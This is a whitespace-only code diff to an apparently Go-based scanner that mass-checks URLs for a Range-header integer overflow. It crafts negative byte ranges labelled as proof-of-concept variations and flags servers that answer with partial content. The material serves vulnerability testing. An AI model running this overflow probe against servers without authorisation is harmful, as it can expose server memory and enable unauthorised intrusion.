@@ -23,10 +23,11 @@ func main() {
 		url := sc.Text()
 		baseResp, err := cl.DoRequest(url, "")
 		if err != nil {
-		    continue
+			continue
 		}
-		res, err := cl.CheckVuln(baseResp); if err != nil {
-		    continue
+		res, err := cl.CheckVuln(baseResp)
+		if err != nil {
+			continue
 		}
 		fmt.Printf("%s\t%d,%d\n", res.url, res.rs, res.re)
 	}
@@ -81,27 +82,26 @@ func (cl *Client) CheckVuln(r *http.Response) (Result, error) {
 	}
 
 	if resp.StatusCode == 206 && resp.Header.Get("Content-Range") != "" {
-	    return Result{url, rs, re}, nil
+		return Result{url, rs, re}, nil
 	}
 	return Result{}, errors.New("not vulnerable")
 }
 
 func overflowRange(cLen int) (rs, re int) {
-    // PoC variation 1
+	// PoC variation 1
 	// bytesLength := cLen + 623
 	// rs = -bytesLength
 	// re, _ = strconv.Atoi(fmt.Sprintf("-9223372036854%d", 776000 - bytesLength))
 
 	// PoC variation 2
 	n := cLen + 605
-	t, _ := strconv.ParseInt("0x8000000000000000",0,64)
+	t, _ := strconv.ParseInt("0x8000000000000000", 0, 64)
 	rs, re = -n, -(int(t) - n)
 
 	return
 }
 
 type Result struct {
-	url string
+	url    string
 	rs, re int
 }
-
